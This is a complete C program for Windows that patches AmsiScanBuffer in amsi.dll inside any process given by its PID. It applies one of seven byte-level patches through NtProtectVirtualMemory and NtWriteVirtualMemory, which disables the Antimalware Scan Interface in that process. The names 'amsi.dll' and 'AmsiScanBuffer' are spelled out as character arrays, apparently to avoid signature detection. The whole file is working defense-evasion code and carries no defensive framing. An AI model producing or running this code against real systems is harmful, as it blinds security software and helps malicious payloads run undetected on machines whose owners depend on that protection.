#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "ntdll")


#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

char ams1[] = { 'a','m','s','i','.','d','l','l',0 };
char ams1Sb[] = { 'A','m','s','i','S','c','a','n','B','u','f','f','e','r',0 };

EXTERN_C NTSTATUS NtProtectVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten OPTIONAL);



void AMS1patch(HANDLE hproc, int offset, const char* patch, int size) {

	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams1Sb);

	char Patch[100];
	ZeroMemory(Patch, 100);
	lstrcatA(Patch, patch);


	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	void* ptraddr = (void*)(((INT_PTR)ptr + 0xc));


	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		return;
	}

	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (LPVOID)((INT_PTR)ptr + offset), (PVOID)Patch, size, (SIZE_T*)nullptr);
	if (!NT_SUCCESS(NtWriteStatus)) {
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return;
	}

	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
		return;
	}

	printf("\n[+] AMSI patched !!\n\n");
}


void AMS1patch2(HANDLE hproc) {

	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams1Sb);

	// 0:  81 3b 44 31 52 4b       cmp    DWORD PTR [rbx],0x4b523144  => compare AMSI,D1RK
	// 7:  75 50                   jne     amsi!AmsiScanBuffer+0xd5   => triggered

	char Patch[100];
	ZeroMemory(Patch, 100);
	lstrcatA(Patch, "\x81\x3B\x44\x31\x52\x4B");


	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	void* ptraddr = (void*)(((INT_PTR)ptr + 0x7D));


	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		return;
	}
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (LPVOID)((INT_PTR)ptr + 0x7D), (PVOID)Patch, 6, (SIZE_T*)nullptr);
	if (!NT_SUCCESS(NtWriteStatus)) {
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return;
	}
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
		return;
	}

	printf("\n[+] AMSI patched !!\n\n");
}


int main(int argc, char** argv) {

	HANDLE hProc;
	
	if (argc < 3) {
		printf("USAGE: AMS1-Patch.exe <PID> <PatchNumber\n");
		return 1;
	}

	hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)atoi(argv[1]));
	if (!hProc) {
		printf("Failed in OpenProcess (%u)\n", GetLastError());
		return 2;
	}

	int patchNum = atoi(argv[2]);
	if (patchNum == 1)
		AMS1patch(hProc, 0x6A, "\x48\x31\xF6", 3);	// xor rsi,rsi at offset 0x6A
	else if (patchNum == 2)
		AMS1patch(hProc, 0x6F, "\x31\xFF", 2);		// xor edi,edi at offset 0x6F
	else if (patchNum == 3)
		AMS1patch(hProc, 0x73, "\x48\x31\xED", 3);	// xor rbp,rbp at offset 0x73
	else if (patchNum == 4)
		AMS1patch(hProc, 0x78, "\x48\x31\xDB", 3);	// xor rbx,rbx at offset 0x78
	else if (patchNum == 5)
		AMS1patch(hProc, 0x89, "\x48\x31\xC0", 3);	// xor rax,rax at offset 0x89
	else if (patchNum == 6)
		AMS1patch(hProc, 0x92, "\x48\x31\xC9", 3);	// xor rcx,rcx at offset 0x92
	else
		AMS1patch2(hProc);	// compare AMSI,D1RK


	return 0;

}
